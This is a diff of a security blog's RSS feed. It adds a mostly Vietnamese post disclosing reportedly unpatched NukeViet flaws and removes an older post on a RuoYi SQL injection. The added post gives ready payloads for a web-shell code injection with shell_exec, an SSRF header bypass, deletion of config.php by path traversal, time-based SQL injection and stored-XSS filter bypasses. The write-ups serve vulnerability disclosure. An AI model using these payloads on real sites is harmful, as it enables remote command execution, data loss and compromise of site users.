@@ -3,9 +3,285 @@
         <title>g03m0n</title>
         <link>https://g03m0n.github.io/</link>
         <description>g03m0n</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 12 May 2026 08:31:01 &#43;0800</lastBuildDate>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 08 Jul 2026 08:31:01 &#43;0800</lastBuildDate>
             <atom:link href="https://g03m0n.github.io/index.xml" rel="self" type="application/rss+xml" />
         <item>
+    <title>Nukeviet 0-days research</title>
+    <link>https://g03m0n.github.io/posts/nukeviet-0-days-research/</link>
+    <pubDate>Wed, 08 Jul 2026 08:31:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/nukeviet-0-days-research/</guid>
+    <description><![CDATA[<h1 id="nukeviet-0-days-research">Nukeviet 0-days research</h1>
+<h2 id="code-injection-lead-to-rce-at-seo-tool-function-in-nukeviet"><strong>Code Injection lead to RCE at SEO Tool function in nukeviet</strong></h2>
+<h3 id="description"><strong>Description</strong></h3>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Version Affected</strong></th>
+<th><strong>Authentication required</strong></th>
+<th><strong>?-day</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Code Injection</td>
+<td>≤ 4.5.08</td>
+<td>Yes (admin)</td>
+<td>0-day</td>
+</tr>
+</tbody>
+</table>
+<h3 id="root-cause">Root cause</h3>
+<h4 id="source">Source</h4>
+<p><code>admin\seotools\robots.php</code></p>
+<p></p>
+<p>Hàm <code>$nv_Request-&gt;get_array('filename', 'post')</code> ở dòng 19 lấy dữ liệu từ array <code>$_POST['filename']</code> với body có dạng <code>filename[&lt;key&gt;] = &lt;value&gt;</code>.</p>
+<p>Tại dòng 32, input đi qua hàm <code>serialize()</code> và gắn vào biến <code>$content_config</code></p>
+<h4 id="sink"><strong>Sink</strong></h4>
+<p>Tại dòng 35, data đã được serialize được đưa vào vào hàm <code>file_put_content()</code> để ghi vào file <code>/data/config/robots.php</code></p>
+<p></p>
+<p>Cuối cùng, tại dòng 86, file cache vừa được tạo được <code>include</code> để đọc lại cấu hình, code PHP bị nhúng bên trong sẽ lập tức được thực thi.</p>
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+<p>Đăng nhập vào giao diện Admin → SEO tool → <code>Config. robots.txt</code></p>
+<p></p>
+<p>Kéo xuống cuối → Submit → Intercept Request và thêm payload vào cuối file
+Payload: <code>&amp;filename%5b'%3b%20extract(%24_GET)%3b%20echo%20shell_exec(%24cmd)%3b%2f%2f%5d%3d1</code>
+Decode: <code>&amp;filename['; extract($_GET); echo shell_exec($cmd);//]=1</code></p>
+<p></p>
+<p>Forward → Truy cập lại url:</p>
+<p><code>http://localhost/nukeviet222/admin/index.php?language=en&amp;nv=seotools&amp;op=robots&amp;rand=t2CjiR6I&amp;cmd=&lt;command&gt;</code></p>
+<p></p>
+<p>File cache robots đã được ghi trên server:</p>
+<p><code>data\config\robots.php</code></p>
+<p></p>
+<h2 id="pre-auth-ssrf-in-nukeviet">Pre-auth SSRF in nukeviet</h2>
+<h3 id="description-1">Description</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Version Affected</strong></th>
+<th><strong>Authentication required</strong></th>
+<th><strong>?-day</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSRF</td>
+<td>≤ 4.5.08</td>
+<td>No</td>
+<td>0-day</td>
+</tr>
+</tbody>
+</table>
+<h3 id="root-cause-1">Root cause</h3>
+<p><strong>Source</strong></p>
+<p><code>vendor/vinades/nukeviet/Core/Server.php</code></p>
+<p></p>
+<p>Ứng dụng lấy thông tin từ HTTP Header <code>X-Forwarded-Host</code> (hoặc <code>HTTP_X_FORWARDED_HOST</code>) từ request và gán vào <code>$original_host</code>.</p>
+<p>VD:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">X</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Forwarded</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>
+</span></span></code></pre></div><p><code>$original_host</code> = “attacker.com”</p>
+<p>Tiếp theo, nếu <code>$original_host</code> !== false thì nhảy xuống hàm <code>standardizeHost()</code> để làm sạch host:</p>
+<p></p>
+<p>Regex này có tác dụng nhằm loại bỏ port ở cuối cùng của Host.</p>
+<p><code>127.0.0.1:8080 → 127.0.0.1</code></p>
+<p>Có thể bypass regex này bằng dấu gạch chéo (<code>/</code>) vào cuối host. Ví dụ <code>127.0.0.1:8081/</code>. Khi đó, chuỗi kết thúc bằng dấu <code>/</code> chứ không phải là chữ số, làm cho regex <code>(\:[0-9]+)$</code> mất tác dụng và không thể cắt bỏ được phần port.</p>
+<p>→ <code>$this-&gt;original_host</code> = <code>127.0.0.1:8081/</code>.</p>
+<p><strong>Sink</strong></p>
+<p><code>includes/ini.php</code></p>
+<p></p>
+<p>Hàm <code>server_info_update()</code> có tác dụng tự động thăm dò môi trường của máy chủ Web. Nó sẽ tự gửi HTTP Request đến chính website của mình, sau đó đọc lại các HTTP Header trả về để xem server có hỗ trợ HTTP/2, HTTPS-Only, hoặc các cơ chế nén dữ liệu hay không. Từ đó cập nhật bộ nhớ đệm và <code>config_global.php</code>.</p>
+<p>Để biết cần gửi request đến đâu, tại dòng 30, hàm này gọi phương thức <code>$nv_Server-&gt;getOriginalHost()</code>:</p>
+<p></p>
+<p>Chính là <code>original_host</code> được lấy từ header <code>X-Forwarded-Host</code> ở phía trên.</p>
+<p>Tại dòng 44,  hệ thống khởi tạo hàm <code>curl_init</code> với URL được nối thẳng cùng biến <code>$host</code>  do attacker kiểm soát.</p>
+<p>Tại dòng 55, ứng dụng sử dụng hàm <code>curl_exec()</code> để gửi request đến url do attacker kiểm soát.</p>
+<h3 id="steps-to-reproduce-1">Steps to reproduce</h3>
+<p>Gửi một POST Request đến endpoint bất kỳ kèm:</p>
+<ul>
+<li>
+<p>Header:</p>
+<p><strong>X-Forwarded-Proto: http
+X-Forwarded-Host: 127.0.0.1:8081/</strong></p>
+</li>
+<li>
+<p>Body: <code>__serverInfoUpdate=1</code></p>
+</li>
+</ul>
+<p>Request</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">nukeviet</span><span style="color:#f92672">/</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">localhost</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Chromium&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;127&#34;</span>, <span style="color:#e6db74">&#34;Not)A;Brand&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;99&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Language</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">en</span><span style="color:#f92672">-</span><span style="color:#a6e22e">US</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">mobile</span><span style="color:#f92672">:</span> <span style="color:#f92672">?</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Mozilla</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (<span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">NT</span> <span style="color:#ae81ff">10.0</span>; <span style="color:#a6e22e">Win64</span>; <span style="color:#a6e22e">x64</span>) <span style="color:#a6e22e">AppleWebKit</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (<span style="color:#a6e22e">KHTML</span>, <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">Gecko</span>) <span style="color:#a6e22e">Chrome</span><span style="color:#f92672">/</span><span style="color:#ae81ff">127.0.6533.100</span> <span style="color:#a6e22e">Safari</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">platform</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Windows&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Site</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">same</span><span style="color:#f92672">-</span><span style="color:#a6e22e">origin</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Mode</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">no</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cors</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Dest</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//localhost/nukeviet/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Encoding</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">gzip</span>, <span style="color:#a6e22e">deflate</span>, <span style="color:#a6e22e">br</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#a6e22e">X</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Forwarded</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Proto</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">X</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Forwarded</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8081</span><span style="color:#f92672">/**</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">keep</span><span style="color:#f92672">-</span><span style="color:#a6e22e">alive</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">urlencoded</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__serverInfoUpdate</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p></p>
+<p></p>
+<p><code>oast.fun</code></p>
+<p></p>
+<p></p>
+<h2 id="path-traversal-to-arbitrary-file-deletion-in-edit-comment-function">Path Traversal to <strong>Arbitrary File Deletion in Edit Comment Function</strong></h2>
+<h3 id="description-2">Description</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Version Affected</strong></th>
+<th><strong>Authentication required</strong></th>
+<th><strong>?-day</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Path traversal</td>
+<td>≤ 4.5.08</td>
+<td>Yes (Admin)</td>
+<td>0-day</td>
+</tr>
+</tbody>
+</table>
+<h3 id="root-cause-2"><strong>Root Cause</strong></h3>
+<p><code>modules/comment/admin/edit.php</code></p>
+<p></p>
+<p>Dòng 48, ứng dụng nhận giá trị  <code>attach</code> qua HTTP POST.</p>
+<p>Dòng 50, hàm substr() thực hiện cắt bỏ phần tiền tố của attach</p>
+<p>VD:</p>
+<ul>
+<li><code>NV_BASE_SITEURL</code>: <code>/nukeviet/</code></li>
+<li><code>NV_UPLOADS_DIR</code>: <code>uploads</code></li>
+<li><code>$module_upload</code>: <code>comment</code></li>
+</ul>
+<p>→  <strong><code>/nukeviet/uploads/comment/</code></strong> </p>
+<p>Hàm <code>strlen('/nukeviet/uploads/comment/')</code> đếm độ dài chuỗi này là <strong>26 ký tự</strong>.</p>
+<p>→ <code>$attach = substr($attach, 26);</code> : lấy chuỗi từ vị trí thứ 26 trở đi.</p>
+<p>Dòng 55,  <code>$attach</code> được lưu vào database.</p>
+<p></p>
+<p>Sau đó, lỗ hổng Xóa file bị kích hoạt tại:</p>
+<p><code>modules/comment/admin/del.php</code></p>
+<p></p>
+<p></p>
+<p>Do hàm <code>nv_deletefile()</code> không có các bước chặn path traversal và chỉ giới hạn việc xóa không vượt quá Root Dir mà không chặn xóa tệp ngoài thư mục Upload. Do đó, các tệp như  <code>config.php</code> sẽ bị xóa mất bằng payload:</p>
+<p><code>attach=aaaaaaaaaaaaaaaaaaaaaaaaaa../../config.php</code> (26 ký tự a)</p>
+<h3 id="steps-to-reproduce-2">Steps to reproduce</h3>
+<p>Goal: Xóa file <code>config.php</code></p>
+<p>Truy cập trang admin → Quản lý bình luận</p>
+<p></p>
+<p>Chọn một bình luận bất kỳ và edit:</p>
+<p></p>
+<p>Intercept lại request và thêm payload <code>aaaaaaaaaaaaaaaaaaaaaaaaaa../../config.php</code> vào param <code>attach</code>:</p>
+<p></p>
+<p>Forward và tiến hành xóa bình luận đó:</p>
+<p></p>
+<p>Xóa thành công file config → Ứng dụng tự động redirect về trang install:</p>
+<p></p>
+<h2 id="post-auth-sql-injection-in-module_shops-version--4503-of-nukeviet"><strong>Post-Auth SQL Injection in module_shops version &lt;= 4.5.03 of nukeviet</strong></h2>
+<h3 id="description-3">Description</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Version Affected</strong></th>
+<th><strong>Authentication required</strong></th>
+<th>?-day</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQL Injection</td>
+<td>≤ 4.5.08, module_shops &lt;= 4.5.03</td>
+<td>Yes</td>
+<td>0-day</td>
+</tr>
+</tbody>
+</table>
+<h3 id="root-cause-3">Root cause</h3>
+<p><code>modules\shops\admin\order.php</code></p>
+<p></p>
+<p>The data from the <code>order_payment</code> parameter is concatenated directly into the SQL query without validation.</p>
+<p>This query is executed at:</p>
+<p></p>
+<h3 id="steps-to-reproduce-3">Steps to reproduce</h3>
+<p>Log in with an administrator account and navigate to the Shops module:</p>
+<p></p>
+<p>Intercept the <code>Search</code> request and inject the following payload into the order_payment parameter: <code>-999%20or%20sleep(3)%20--%20a</code></p>
+<p>This payload causes the application to sleep for a total of 18 seconds (3 seconds for each of the 6 columns).</p>
+<p></p>
+<h2 id="multiple-anti-xss-filter-bypasses-leading-to-stored-xss-in-news-module">Multiple Anti-XSS Filter Bypasses leading to Stored XSS in News Module.</h2>
+<h3 id="description-4">Description</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Version Affected</strong></th>
+<th><strong>Authentication required</strong></th>
+<th><strong>?-day</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stored XSS</td>
+<td>≤ 4.5.08</td>
+<td>Yes (Low)</td>
+<td>0-day</td>
+</tr>
+</tbody>
+</table>
+<h3 id="root-cause-4">Root cause</h3>
+<p><code>modules/news/funcs/content.php</code></p>
+<p></p>
+<p></p>
+<p>Tại Dòng 392-393, hệ thống lấy dữ liệu nội dung từ POST Request.
+Do hằng số <code>NV_EDITOR</code> luôn được định nghĩa, hệ thống sẽ thực thi nhánh <code>nv_nl2br($bodyhtml, '')</code>. Hàm này chỉ xử lý ngắt dòng và không có chức năng làm sạch dữ liệu.</p>
+<p></p>
+<p>Ứng dụng chỉ validate input người dùng bằng hàm <code>get_string()</code> với request POST.
+Đi vào hàm <code>get_string()</code> -&gt; <code>get_value()</code> -&gt; <code>security_post()</code>:</p>
+<p></p>
+<p>Hàm <code>security_pos()</code> (dòng 1058) gọi <code>$value = $this-&gt;filterTags($value);</code>
+Tại đây ứng dụng gọi hàm <code>filterAttr()</code> :</p>
+<p></p>
+<p>Đi vào hàm <code>filterAttr()</code>:</p>
+<p></p>
+<p>Do hàm <code>trim()</code> của PHP chỉ xóa các ký trị khoảng trắng, không xóa ký tự <code>Form Feed (0x0C)</code> , chuỗi <code>[0x0C]onerror</code> dễ dàng vượt qua bộ lọc <code>preg_match('/^on/i')</code> để lưu vào cơ sở dữ liệu. Khi hiển thị ở frontend, trình duyệt HTML5 lại nhận diện <code>0x0C</code> là một khoảng trắng hợp lệ, từ đó kích hoạt thuộc tính <code>onerror</code> và thực thi javascript.
+Payload mẫu: <code>&lt;img src=x %0Conerror=alert('0-click-XSS')&gt;</code></p>
+<p>Ngoài ra, còn có thể Bypass data URI bằng Entity <code>&amp;#9;</code> (XSS qua thẻ <!-- raw HTML omitted -->).</p>
+<p></p>
+<p>Regex sử dụng <code>\s*</code> để bắt khoảng trắng, nhưng <code>\s</code> của PHP không hiểu Entity <code>&amp;#9;</code> . Do đó, Regex không phát hiện ra javascript. Có thể sử dụng HTML Entity (Tab) chèn vào giữa chữ javascript để bỏ qua <code>preg_replace</code> này.</p>
+<p>Payload mẫu: <code>&lt;a href=&quot;jav&amp;#9;ascript:alert('XSS_Bypass')&quot;&gt;Click me&lt;/a&gt;</code></p>
+<h3 id="steps-to-reproduce-4">Steps to reproduce</h3>
+<p>Sử dụng tài khoản user có quyền đăng bài viết.</p>
+<p>Tin tức -&gt; Quản lý bài viết -&gt; Đăng bài viết</p>
+<p></p>
+<p>Đăng bài viết với đầy đủ thông tin và Intercept request.</p>
+<p></p>
+<p>Chèn payload: <code>Content%3a%20%3cimg%20src%3d%22x%22%20%0conerror%3d%22alert('0-click-XSS')%22%20%3e</code> vào trường <code>bodyhtml</code> và Forward Request:</p>
+<p></p>
+<p>Truy cập Tin tức -&gt; Quản lý bài viết -&gt; Bài viết vừa tạo:</p>
+<p></p>
+<p>XSS Triggered.</p>
+<p>Làm tương tự với cách bypass thứ 2 kèm payload: <code>Content%3a+&lt;a+href%3d&quot;jav%26%239%3bascript%3aalert('XSS_Bypass')&quot;&gt;Click+me&lt;/a&gt;</code></p>
+<p></p>
+<p>Click <code>Click me</code> -&gt; XSS Triggered</p>
+<p></p>
+]]></description>
+</item>
+<item>
     <title>Post-Auth SQL Injection in module_shops version &lt;= 4.5.03 of nukeviet</title>
     <link>https://g03m0n.github.io/posts/nukeviet-sql-injection/</link>
     <pubDate>Tue, 12 May 2026 08:31:01 &#43;0800</pubDate>
@@ -962,57 +1238,6 @@ Access <strong><code>Receive Shipments</code></strong> to create a new Invoice:<
 <p>Hàm Regex này sẽ tìm và xóa mọi thứ từ đầu chuỗi cho đến dấu hai chấm <code>:</code>.</p>
 <p>Nếu truyền vào giá trị <code>xlink:href</code> (hoặc bất kỳ tên ảo nào như <code>abc:href</code>), hàm này sẽ cắt bỏ phần đầu, chỉ giữ lại chữ <code>href</code>.</p>
 <p>Khi đó, phép so sánh cuối cùng sẽ là <code>'href' === 'href'</code> (trả về True).</p>
-]]></description>
-</item>
-<item>
-    <title>Blind SQL Injection at Rouyi framework ≤ v4.7.9 (CVE-2024-42900)</title>
-    <link>https://g03m0n.github.io/posts/cve-2024-42900/</link>
-    <pubDate>Tue, 27 Aug 2024 08:29:01 &#43;0800</pubDate>
-    <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/cve-2024-42900/</guid>
-    <description><![CDATA[<h1 id="blind-sql-injection-at-rouyi-framework--v479-cve-2024-42900">Blind SQL Injection at Rouyi framework ≤ v4.7.9 (CVE-2024-42900)</h1>
-<h2 id="1-description-and-impact">1. <strong>Description and Impact</strong></h2>
-<p>The Blind SQL Injection vulnerability occurs in the file <code>com/ruoyi/generator/controller/GenController</code> specifically at the endpoint <code>/tool/gen/createTable</code>. Manipulating this file allows an attacker to execute arbitrary SQL commands, which can endanger the security, integrity, and availability of the system.</p>
-<p>SQL injection vulnerability in <code>/tool/gen/createTable</code> in Ruoyi Framework at version ≤ 4.7.9 allows attackers to execute arbitrary SQL commands via the <code>sql</code> parameter.</p>
-<table>
-<thead>
-<tr>
-<th><strong>Type</strong></th>
-<th><strong>Required Authentication</strong></th>
-<th><strong>Version Affected</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>SQL Injection</td>
-<td>Yes</td>
-<td>All versions</td>
-</tr>
-</tbody>
-</table>
-<h2 id="2-root-cause-analysis">2. <strong>Root Cause Analysis</strong></h2>
-<p>After patching vulnerabilities <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4566" target="_blank" rel="noopener noreffer">CVE-2022-4566</a>
- with commit <a href="https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40" target="_blank" rel="noopener noreffer">https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40</a>
-, the SQLi vulnerability still exists at the endpoint <code>/tool/gen/createTable</code> as <strong>Blind SQLi.</strong></p>
-<p>Read my CVE-2022-4566 analyze <a href="https://g03m0n.github.io/posts/cve-2022-4566/" target="_blank" rel="noopener noreffer">here</a>
-</p>
-<h2 id="3-steps-to-reproduce">3. <strong>Steps to reproduce</strong></h2>
-<p><strong>Set up environment</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">git</span> <span style="color:#66d9ef">clone</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">gitee</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">y_project</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RuoYi</span><span style="color:#f92672">.</span><span style="color:#a6e22e">git</span>
-</span></span></code></pre></div><p><a href="https://doc.ruoyi.vip/ruoyi/document/hjbs.html" target="_blank" rel="noopener noreffer">https://doc.ruoyi.vip/ruoyi/document/hjbs.html</a>
-</p>
-<p><strong>PoC</strong></p>
-<p>Log in using the account<code>admin/admin123</code>and send a POST request to the endpoint <code>/tool/gen/createTable</code></p>
-<p><strong>Payload</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>sql<span style="color:#f92672">=</span>create table test <span style="color:#66d9ef">as</span> select<span style="color:#f92672">/**/*</span> <span style="color:#f92672">from</span> sys_job where <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> union select<span style="color:#f92672">/**/</span>sleep(<span style="color:#ae81ff">10</span>),<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>;
-</span></span></code></pre></div><p></p>
-
-   <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-     <iframe src="https://www.youtube.com/embed/4rmbBW8QHOk" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-   </div>
-
 ]]></description>
 </item>
 </channel>
